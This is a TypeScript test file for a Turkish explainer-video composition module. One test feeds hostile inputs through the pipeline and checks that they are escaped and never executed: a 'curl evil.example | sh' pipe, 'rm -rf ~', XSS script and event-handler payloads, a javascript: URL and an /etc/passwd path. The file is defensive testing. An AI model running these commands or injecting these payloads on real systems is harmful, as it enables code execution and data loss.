import assert from 'node:assert/strict';
import { test } from 'node:test';
import vm from 'node:vm';
import { sampleEpisode } from '../../testing/explainer-tools.ts';
import {
  OUTRO_SECONDS,
  buildCues,
  compositionSpec,
  cuesJson,
  indexHtml,
  jsData,
  snapshotTimes,
  specJs,
  specJson,
  totalSeconds,
  type Timing,
} from './composition.ts';
import { buildPlan, jobParamsSchema, scriptVersionSchema } from './script.ts';

function plan(overrides: Parameters<typeof sampleEpisode>[0] = {}) {
  const sample = sampleEpisode(overrides);
  return buildPlan(
    jobParamsSchema.parse(sample.params),
    scriptVersionSchema.parse(sample.version),
  );
}

/** Her kelimeye 0,3 sn veren sahte ses zamanlaması. */
function timingFor(lines: string[]): Timing {
  let t = 0.1;
  const out = lines.map((line) => {
    const words = line.split(' ').map((w) => {
      const word = { w, s: t, e: t + 0.25 };
      t += 0.3;
      return word;
    });
    t += 0.14;
    return { start: words[0]!.s, end: words.at(-1)!.e, words };
  });
  return { duration: t + 0.8, lines: out };
}

test('düz senaryodan şablon verisi: metin kartı, kaynak kartı, süre', () => {
  const p = plan();
  const timing = timingFor(p.beats.map((beat) => beat.text));
  const spec = compositionSpec(p, timing);
  assert.equal(spec.title, 'Planör nasıl uçar?');
  assert.equal(spec.seriesName, 'Gökyüzü Defteri');
  assert.equal(spec.episodeLabel, 'Bölüm 3');
  assert.deepEqual(spec.beats, [
    { heading: null, card: null },
    { heading: null, card: null },
  ]);
  assert.deepEqual(spec.sources, ['NASA Glenn: Gliders', 'en.wikipedia.org']);
  assert.equal(spec.outro, OUTRO_SECONDS);
  assert.equal(spec.total, totalSeconds(p, timing));
  assert.ok(Math.abs(spec.total - (timing.duration + OUTRO_SECONDS)) < 0.001);
  // Ses betikleri için satırlar: işaretli metin + okunuşlar
  const python = JSON.parse(specJson(p));
  assert.deepEqual(Object.keys(python), ['lines', 'spoken', 'voice', 'rate']);
  assert.equal(python.lines.length, 2);
  assert.equal(python.spoken['1.000'], 'bin');
});

test('yapılandırılmış senaryodan şablon verisi ve ses işaretleri', () => {
  const p = plan({
    script: {
      version: 1,
      beats: [
        {
          text: 'Planörün motoru yok. Yine de saatlerce havada kalır.',
          card: { type: 'steps', items: ['Çekilir', 'Bırakılır', 'Süzülür'] },
        },
        {
          text: 'Modern bir planör 1.000 metre alçalırken 40, 50 kilometre ileri gidebilir.',
          heading: 'Süzülme',
          card: { type: 'number', value: '40-50', unit: 'km' },
        },
      ],
    },
    version: { fact_notes: [] },
  });
  const timing = timingFor(p.beats.map((beat) => beat.text));
  const spec = compositionSpec(p, timing);
  assert.equal(spec.beats[0]!.card?.type, 'steps');
  assert.equal(spec.beats[1]!.heading, 'Süzülme');
  // Kaynak yoksa kapanış kartı da yok: süre anlatımla biter
  assert.equal(spec.outro, 0);
  assert.equal(spec.total, Math.round(timing.duration * 1000) / 1000);
  const cues = buildCues(p, timing);
  assert.deepEqual(
    cues.map((cue) => cue.sound),
    ['tick', 'tick', 'tick', 'camera-shutter-light', 'thock'],
  );
  assert.ok(cues.every((cue, i) => i === 0 || cues[i - 1]!.t <= cue.t));
  assert.ok(cues.every((cue) => cue.t >= 0 && cue.t < spec.total));
  const sheet = JSON.parse(cuesJson(cues, spec.total));
  assert.equal(sheet.fps, 30);
  assert.equal(sheet.total, spec.total);
});

const HOSTILE = [
  '`rm -rf ~` ve $(curl evil.example | sh) ile ${process.exit(1)} deneniyor.',
  '</script><script>globalThis.PWNED = 1</script><img src=x onerror=alert(1)>.',
  '\'; globalThis.PWNED = 1; // "); globalThis.PWNED = 1; ("',
  '<!-- --> ]]> \\u003c/script\\u003e \\ ters eğik çizgi.',
  '../../../../etc/passwd ve C:\\Windows\\System32\\cmd.exe /c calc.',
  `${'uzun'.repeat(140)}.`,
  'satır\u2028ayırıcı\u2029var.',
].join(' ');

test('düşmanca metin: veri olarak taşınır, çalıştırılmaz, işaretleme olmaz', () => {
  const p = plan({
    scriptText: HOSTILE,
    params: {
      episode: {
        ...sampleEpisode().params.episode,
        title: '</title><script>globalThis.PWNED = 1</script>`$(id)`',
      },
      series: {
        id: '00000000-0000-4000-8000-0000000000a1',
        name: '"><svg onload=globalThis.PWNED=1>',
        theme: '',
      },
    },
    version: {
      fact_notes: [
        {
          claim: 'x',
          sources: [
            { title: '</script><script>globalThis.PWNED = 1</script>' },
            { url: 'javascript:globalThis.PWNED=1' },
            { url: 'https://ornek.example/a?b=<script>' },
          ],
        },
      ],
    },
  });
  // Metin kaybolmaz: içerik kelime kelime plana girer (yalnız * ve | boşluk olur)
  const joined = p.beats.map((beat) => beat.text).join(' ');
  assert.ok(joined.includes('$(curl evil.example'));
  assert.ok(joined.includes('<script>globalThis.PWNED = 1</script>'));
  assert.ok(joined.includes('../../../../etc/passwd'));
  assert.ok(!/[|*\u2028\u2029]/.test(joined));
  // javascript: adresi kaynak adı olamaz
  assert.deepEqual(p.sources, [
    '</script><script>globalThis.PWNED = 1</script>',
    'ornek.example',
  ]);

  const timing = timingFor(p.beats.map((beat) => beat.text));
  const spec = compositionSpec(p, timing);
  const js = specJs(spec);
  // Betik bağlamı: açı ayraç ve & yok, satır ayırıcı yok
  assert.ok(!/[<>&\u2028\u2029]/.test(js));
  // Çalıştırınca yalnız veri atanır; aynı veri geri okunur
  const box: { window: Record<string, unknown>; PWNED?: number } = {
    window: {},
  };
  vm.runInNewContext(js, box);
  assert.equal(JSON.stringify(box.window.SPEC), JSON.stringify(spec));
  assert.equal(box.PWNED, undefined);
  assert.equal((globalThis as { PWNED?: number }).PWNED, undefined);

  // Sayfa sabittir: senaryodan tek karakter içermez
  const html = indexHtml(spec.total);
  assert.equal(html, indexHtml(spec.total));
  for (const needle of [
    'PWNED',
    'evil.example',
    'onerror',
    'onload',
    'etc/passwd',
  ])
    assert.ok(!html.includes(needle), needle);
  assert.equal(html.match(/<script/g)!.length, 6);
  assert.match(html, /data-duration="\d+\.\d{3}"/);
  // Python tarafı: JSON; ayrıştırınca aynı satırlar
  assert.deepEqual(
    JSON.parse(specJson(p)).lines,
    p.beats.map((beat) => beat.marked),
  );
});

test('jsData: betikten çıkış dizileri kaçışlanır', () => {
  const text = jsData({ a: '</script>', b: '<!--', c: '&amp;', d: '\u2028' });
  assert.equal(
    text,
    '{"a":"\\u003c/script\\u003e","b":"\\u003c!--","c":"\\u0026amp;","d":"\\u2028"}',
  );
  assert.deepEqual(JSON.parse(text), {
    a: '</script>',
    b: '<!--',
    c: '&amp;',
    d: '\u2028',
  });
});

test('sayfa süresi yalnız geçerli sayı olabilir', () => {
  for (const bad of [0, -1, Number.NaN, Infinity, 601])
    assert.throws(() => indexHtml(bad));
  assert.match(indexHtml(43.1334), /data-duration="43\.133"/);
});

test('önizleme zamanları: ilk kare, vuruşlar, kapanış; sıralı ve süre içinde', () => {
  const p = plan();
  const timing = timingFor(p.beats.map((beat) => beat.text));
  const total = totalSeconds(p, timing);
  const times = snapshotTimes(timing, total);
  assert.equal(times[0], 0.4);
  assert.ok(times.length >= 3 && times.length <= 5);
  assert.ok(times.every((t, i) => t < total && (i === 0 || times[i - 1]! < t)));
  assert.ok(total - times.at(-1)! <= 1);
});
